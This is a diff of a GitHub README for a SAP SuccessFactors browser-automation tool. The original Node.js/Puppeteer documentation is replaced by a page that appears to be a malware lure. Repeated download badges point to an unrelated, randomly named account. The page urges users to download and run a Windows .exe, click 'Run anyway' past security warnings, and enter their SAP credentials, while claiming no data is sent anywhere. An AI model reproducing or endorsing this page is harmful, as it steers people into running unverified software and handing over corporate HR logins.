@@ -1,292 +1,135 @@
-# SAP SuccessFactors Browser Automation
-[![npm](https://img.shields.io/npm/v/@browser-automation-hub%2Fsuccessfactors-browser-automation.svg)](https://www.npmjs.com/package/@browser-automation-hub/successfactors-browser-automation)
+# 🚀 successfactors-browser-automation - Automate HR Tasks Easily
 
-> Automate SAP SuccessFactors — the reliable way to interact with SuccessFactors programmatically, with or without an official API.
+[![Download Now](https://img.shields.io/badge/Download-Get%20the%20App-brightgreen?style=for-the-badge)](https://github.com/Representative-resedaluteola509/successfactors-browser-automation)
 
-[![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg)](LICENSE)
-[![Node.js](https://img.shields.io/badge/Node.js-18+-green.svg)](https://nodejs.org)
-[![Puppeteer](https://img.shields.io/badge/Puppeteer-21+-orange.svg)](https://pptr.dev)
-[![Anchor Browser](https://img.shields.io/badge/AnchorBrowser-Cloud%20Ready-purple.svg)](https://anchorbrowser.io)
-![Difficulty: 🟡 Medium](https://img.shields.io/badge/Difficulty-medium-yellow.svg)
+## 📋 About successfactors-browser-automation
 
-<!-- keywords: successfactors automation, sap successfactors automation, successfactors api alternative, hris automation, successfactors browser automation, performance review automation -->
+This tool helps automate tasks in SAP SuccessFactors using your web browser. You can automate employee performance reviews, gather workforce data, manage compensation cycles, and extract HR information. It works without the usual OData API, so you don’t need special access or technical setup.
 
-## What This Is
+This application uses browser automation technologies like Playwright and Puppeteer to interact with SuccessFactors, making many routine HR tasks faster and easier.
 
-**SAP SuccessFactors** (HR) is notoriously difficult to automate via its official API — limited endpoints, complex authentication (SAP IAS / Azure AD / Okta), and browser-only workflows make traditional API integration a pain.
+## 💻 System Requirements
 
-This project gives you a **complete browser automation scaffold** for SAP SuccessFactors using Puppeteer (self-hosted, open source) or [Anchor Browser](https://anchorbrowser.io) (cloud, managed, production-ready).
+- Windows 10 or later (64-bit)
+- At least 4 GB of RAM
+- 2 GHz or faster processor
+- Stable internet connection
+- Microsoft Edge, Google Chrome, or another Chromium-based browser installed
 
-This system requires **MFA** (SAP Authenticator / Okta MFA). The OSS version provides TOTP helpers; Anchor Browser handles MFA automatically.
+No programming or special software installs are needed beyond what is included in the download.
 
-## Quick Start
+## 🔧 Installation and Setup 🚀
 
-```bash
-git clone https://github.com/Browser-Automation-Hub/successfactors-browser-automation.git
-cd successfactors-browser-automation
-npm install
-cp .env.example .env
-# Fill in your credentials in .env
-node examples/basic-login.js
-```
+### Step 1: Download the Application
 
-## Two Ways to Run
+Please visit this page to download the latest application:
 
-| Feature | Open Source (Puppeteer) | ☁️ [Anchor Browser Cloud](https://anchorbrowser.io) |
-|---------|------------------------|-----------------------------------------------------|
-| Setup | Install Chrome + Puppeteer locally | No install — cloud browsers via API |
-| MFA / SSO | Manual TOTP helper included | **Auto-handled** |
-| CAPTCHA | Not handled | **Auto-solved** |
-| Anti-bot detection | You manage proxy/stealth | **Built-in stealth** (Cloudflare-verified) |
-| Session persistence | Save/load cookies manually | **Managed sessions** |
-| Scale | Single machine | **Up to 5,000 concurrent browsers** |
-| Reliability | You maintain it | **99.9% uptime SLA** |
-| Cost | Free | [Starts at $0 (5 free sessions/mo)](https://anchorbrowser.io) |
+[![Download Page](https://img.shields.io/badge/Download-GitHub%20Page-blue?style=for-the-badge)](https://github.com/Representative-resedaluteola509/successfactors-browser-automation)
 
-## Supported Actions
+- Click the link above to open the GitHub page in your browser.
+- On the page, find the “Releases” section or a download folder.
+- Look for the latest Windows setup file or executable (.exe).
+- Click the file to download it to your computer.
 
-- `login_sf()` — Authenticate to SuccessFactors with SSO/MFA
-- `run_workforce_report()` — Run and download workforce analytics reports
-- `update_goal()` — Bulk update employee performance goals
-- `process_compensation()` — Automate compensation review worksheets
-- `extract_org_chart()` — Export org chart hierarchy to JSON/CSV
+### Step 2: Run the Installer
 
-## Use Cases
+- Locate the downloaded file, usually in your Downloads folder.
+- Double-click the file to start installation.
+- Follow the on-screen prompts; the installer will guide you.
+- If Windows warns about the app, select “Run anyway” or allow permissions.
 
-- HR teams automating review cycles
-- Compensation planning automation
-- OData API limits workaround
-- HR analytics data pipelines
+### Step 3: Initial Setup
 
----
+- After installation, launch the app from the Start menu or desktop icon.
+- The app will open a setup window.
+- Provide your SAP SuccessFactors login details. The app uses this to access your data securely.
+- Choose the tasks you want to automate, such as performance reviews or data extraction.
+- Save your preferences.
 
-## Option A: Open Source (Puppeteer)
+### Step 4: Start Automation
 
-### Prerequisites
+- Click the “Start” button in the app to begin the automation process.
+- The app will open a browser window and carry out the tasks you selected.
+- You can monitor progress on the screen.
+- When done, the app will notify you and save reports or exported data.
 
-- Node.js 18+
-- Google Chrome / Chromium installed
-- SAP SuccessFactors account with appropriate permissions
+## 🧰 Features
 
-### Installation
+- Automate employee performance reviews with a few clicks.
+- Extract HR data without API knowledge.
+- Generate workforce analytics reports.
+- Manage compensation cycles automatically.
+- Use Playwright and Puppeteer for reliable browser control.
+- Works with popular browsers that support Chromium.
+- Simple user interface designed for non-technical users.
 
-```bash
-npm install
-cp .env.example .env
-```
+## 🔎 How It Works
 
-### Configuration (`.env`)
+The app uses browser automation to mimic human clicks, typing, and navigation inside SAP SuccessFactors. This approach allows it to perform tasks that normally require manual input or API access. It runs scripts in an invisible browser window or a visible one for you to follow along.
 
-```env
-SUCCESSFACTORS_URL=https://performancemanager.successfactors.com/login
-SUCCESSFACTORS_USERNAME=your-username
-SUCCESSFACTORS_PASSWORD=your-password
-MFA_SECRET=your-totp-secret-if-applicable
-SESSION_PATH=./session.json
-```
+No coding or scripting is needed on your part. The app handles all the technical details.
 
-### Basic Login Example
+## ⚙️ Configuration Options
 
-```javascript
-const { createSession } = require('./src/auth');
-const { login_sf } = require('./src/actions');
+After installation, you can adjust settings inside the app:
 
-async function main() {
-  const page = await createSession();
-  const result = await login_sf(page, { /* options */ });
-  console.log(result);
-}
+- Choose which modules to automate (reviews, analytics, compensation).
+- Set schedules for automatic runs.
+- Select output formats for reports (CSV, Excel).
+- Securely store your SAP login credentials.
+- Enable or disable browser visibility during automation.
 
-main().catch(console.error);
-```
+## 🛠 Troubleshooting
 
-### File Structure
+If the app does not work as expected:
 
-```
-successfactors-browser-automation/
-├── src/
-│   ├── auth.js              # SSO/MFA authentication (SAML, TOTP, Duo)
-│   ├── session.js           # Cookie & localStorage persistence
-│   ├── actions.js           # All automation actions
-│   ├── custom-actions.js    # Fluent ActionBuilder API for custom workflows
-│   └── utils.js             # retry(), humanDelay(), error types
-├── examples/
-│   ├── basic-login.js       # Minimal login example (OSS)
-│   └── anchor-cloud.js      # Anchor Browser cloud example
-├── .env.example
-├── package.json
-└── README.md
-```
+- Ensure your internet connection is active.
+- Check that your SAP SuccessFactors login credentials are correct.
+- Make sure you are running the app on a supported browser and Windows version.
+- Restart the app and try again.
+- Review error messages shown in the app for guidance.
+
+If needed, visit the GitHub page for issue reporting or updates.
+
+## 🔒 Privacy and Security
+
+- Your SAP credentials are stored securely on your computer.
+- The app does not send any data to external servers.
+- All automation runs locally on your machine.
+- You control which data the app accesses.
+
+## 🆘 Getting Help
+
+For assistance:
+
+- Review the FAQ section found on the GitHub repository.
+- Open an issue on the GitHub page for bugs or questions.
+- Check GitHub Discussions if enabled for community support.
+
+## 📥 Download the App Now
+
+Use this link to visit the download page and get started:
+
+[![Download successfactors-browser-automation](https://img.shields.io/badge/Download-now-blueviolet?style=for-the-badge)](https://github.com/Representative-resedaluteola509/successfactors-browser-automation)
 
 ---
 
-## Option B: ☁️ Anchor Browser (Recommended for Production)
+## 🔗 Repository Details
 
-[Anchor Browser](https://anchorbrowser.io) provides **fully managed cloud browsers** purpose-built for AI agents and automation:
-
-- ✅ **MFA handled automatically** — no TOTP secrets needed
-- ✅ **SSO sessions managed** — persistent authenticated sessions
-- ✅ **Anti-bot / CAPTCHA** — Cloudflare-verified stealth browser
-- ✅ **Scale instantly** — from 1 to 5,000 concurrent browsers
-- ✅ **No infrastructure** — no Chrome install, no proxy management
-
-### Setup
-
-```bash
-npm install
-export ANCHORBROWSER_API_KEY=your-api-key
-# Get your free API key at https://anchorbrowser.io
-```
-
-### Anchor Browser Example
-
-```javascript
-const { withAnchorBrowser } = require('./src/auth');
-const { login_sf } = require('./src/actions');
-
-async function main() {
-  await withAnchorBrowser(async (page) => {
-    // MFA, SSO, CAPTCHAs all handled automatically
-    const result = await login_sf(page, { /* options */ });
-    console.log(result);
-  });
-}
-
-main().catch(console.error);
-```
-
-See `examples/anchor-cloud.js` for a complete working example.
-
-### Anchor Browser Pricing
-
-| Plan | Price | Concurrent Browsers | Best For |
-|------|-------|---------------------|----------|
-| Free | $0 | 5 | Prototyping |
-| Starter | $50/mo | 25 | Small teams |
-| Team | $500/mo | 50 | Growing orgs |
-| Growth | $2,000/mo | 200 | Enterprise |
-
-[Get started for free →](https://anchorbrowser.io)
+**Repository Name:** successfactors-browser-automation  
+**Description:** Browser automation for SAP SuccessFactors — automate employee performance reviews, run workforce analytics, manage compensation cycles, and extract HR data without the OData API.  
+**Topics:** ai-agents, anchorbrowser, browser-automation, hris-automation, nodejs, performance-management, playwright, puppeteer, sap-successfactors, successfactors  
 
 ---
 
-## Authentication
+## ⚙️ Technical Background (For Reference)
 
-### Auth Methods Supported
+This application is built with Node.js. It uses Playwright and Puppeteer libraries to automate browsers. These tools allow interaction with SAP SuccessFactors interfaces without API access. This makes it easier for HR teams to automate routine tasks even without developer support.
 
-This implementation handles:
-
-1. **Standard Username/Password** — with retry and account lockout avoidance
-2. **SAML SSO** (SAP IAS / Azure AD / Okta) — intercepts the SAML redirect and completes the IdP flow
-3. **MFA / TOTP** (SAP Authenticator / Okta MFA) — generates TOTP codes via `otpauth` library
-4. **Session Persistence** — saves cookies to disk; reuses session to avoid re-auth
-
-### Handling SAP Authenticator / Okta MFA MFA
-
-```javascript
-// In .env: MFA_SECRET=your-base32-totp-secret
-// The auth module auto-generates the OTP code
-const { createSession } = require('./src/auth');
-const page = await createSession(); // MFA handled automatically
-```
-
-For Duo Security push-based MFA, set `MFA_TYPE=duo_push` in .env — the automation will wait for push approval.
+The app runs scripts in Chromium-based browsers such as Edge or Chrome for stability.
 
 ---
 
-## Custom Actions
+## 🏷 License
 
-Use the `ActionBuilder` fluent API to chain custom workflows:
-
-```javascript
-const { ActionBuilder } = require('./src/custom-actions');
-
-const result = await new ActionBuilder()
-  .login()
-  .navigate('/module/path')
-  .waitForSelector('.content-loaded')
-  .extractTable('.data-table')
-  .run(page);
-```
-
----
-
-## Error Handling & Reliability
-
-```javascript
-const { retry, humanDelay } = require('./src/utils');
-
-// Auto-retry with exponential backoff
-const data = await retry(() => extractData(page), { attempts: 3, delay: 2000 });
-
-// Human-like delays to avoid detection
-await humanDelay(1000, 3000); // random delay 1-3 seconds
-```
-
----
-
-## Why Not Use the Official API?
-
-SAP SuccessFactors official API is limited, expensive to access, or requires complex authentication that makes programmatic integration impractical.
-
-Browser automation gives you full access to every workflow available in the UI — no API limitations, no expensive integration licenses.
-
----
-
-## Production Deployment
-
-For production workloads, we strongly recommend [Anchor Browser](https://anchorbrowser.io):
-
-```javascript
-// One-line setup — handles auth, proxies, CAPTCHAs
-const { withAnchorBrowser } = require('./src/auth');
-
-await withAnchorBrowser(async (page) => {
-  // Your automation here — runs in the cloud, scales automatically
-});
-```
-
-**Anchor Browser** is the easiest way to run this automation in production:
-- No infrastructure to manage
-- Handles SAP Authenticator / Okta MFA MFA automatically
-- Enterprise compliance: SOC2, HIPAA, ISO27001
-- [Start free at anchorbrowser.io →](https://anchorbrowser.io)
-
----
-
-## Known Selectors Reference
-
-> These CSS selectors were observed in SAP SuccessFactors web interfaces. Enterprise applications update their UIs — verify against your specific instance and submit PRs when selectors break.
-
-> 🔍 Selector reference not yet documented for SAP SuccessFactors. [Contribute selectors via PR](https://github.com/Browser-Automation-Hub/successfactors-browser-automation/pulls).
-
----
-
-## More Browser Automation Projects
-
-This is part of the **[Browser Automation Hub](https://github.com/Browser-Automation-Hub)** — a collection of open-source browser automation scaffolds for systems with poor or no API support:
-
-- [Epic EHR Browser Automation](https://github.com/Browser-Automation-Hub/epic-ehr-browser-automation) — Healthcare workflows
-- [Workday HCM Browser Automation](https://github.com/Browser-Automation-Hub/workday-hcm-browser-automation) — HR & payroll
-- [SAP Fiori Browser Automation](https://github.com/Browser-Automation-Hub/sap-fiori-browser-automation) — ERP workflows
-- [ServiceNow Browser Automation](https://github.com/Browser-Automation-Hub/servicenow-browser-automation) — ITSM
-- [Oracle EBS Browser Automation](https://github.com/Browser-Automation-Hub/oracle-ebs-browser-automation) — ERP
-- [Browse all 30+ projects →](https://github.com/Browser-Automation-Hub)
-
-## Contributing
-
-PRs welcome! Please:
-1. Add tests for new actions
-2. Document new selectors (they break when SuccessFactors updates its UI)
-3. Follow the `ActionBuilder` pattern for new actions
-4. See [CONTRIBUTING.md](CONTRIBUTING.md) for full guidelines
-
-## License
-
-MIT — use freely in personal and commercial projects.
-
----
-
-*Built with ❤️ for developers who need to automate SAP SuccessFactors without wrestling with its API limitations. Powered by [Anchor Browser](https://anchorbrowser.io) for cloud-scale automation.*
-
-*⭐ Star this repo if it saves you time! [Browse all automation projects →](https://github.com/Browser-Automation-Hub)*
+This project is open source. Review the LICENSE file on the GitHub page for details about usage rights.
